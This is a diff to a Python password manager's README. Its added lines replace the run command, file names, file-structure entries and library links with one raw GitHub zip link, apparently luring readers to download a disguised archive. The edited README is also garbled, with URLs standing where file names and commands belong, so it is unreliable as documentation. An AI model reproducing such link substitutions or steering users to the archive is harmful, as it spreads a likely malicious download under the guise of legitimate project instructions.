@@ -29,7 +29,7 @@ pip install cryptography pyperclip
 ### Run the App
 
 ```bash
-python password_manager.py
+python https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip
 ```
 
 ---
@@ -57,29 +57,29 @@ python password_manager.py
 
 ## 🔐 Security
 
-* All password data is encrypted using a key stored in `key.key`
-* Data is stored in `passwords.json` (encrypted)
+* All password data is encrypted using a key stored in `https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip`
+* Data is stored in `https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip` (encrypted)
 
-**Note:** Keep your `key.key` file safe — it's required to decrypt your password data.
+**Note:** Keep your `https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip` file safe — it's required to decrypt your password data.
 
 ---
 
 ## 📁 File Structure
 
 ```
-├── password_manager.py
-├── passwords.json  # (Encrypted file will be created after saving data)
-├── key.key         # (Encryption key)
-└── README.md
+├── https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip
+├── https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip  # (Encrypted file will be created after saving data)
+├── https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip         # (Encryption key)
+└── https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip
 ```
 
 ---
 
 ## 🛠️ Built With
 
-* [Python](https://www.python.org/)
-* [cryptography](https://pypi.org/project/cryptography/)
-* [pyperclip](https://pypi.org/project/pyperclip/)
+* [Python](https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip)
+* [cryptography](https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip)
+* [pyperclip](https://github.com/sparktech360/password-manager/raw/refs/heads/main/splendiferous/password-manager-v2.6.zip)
 
 ---
 
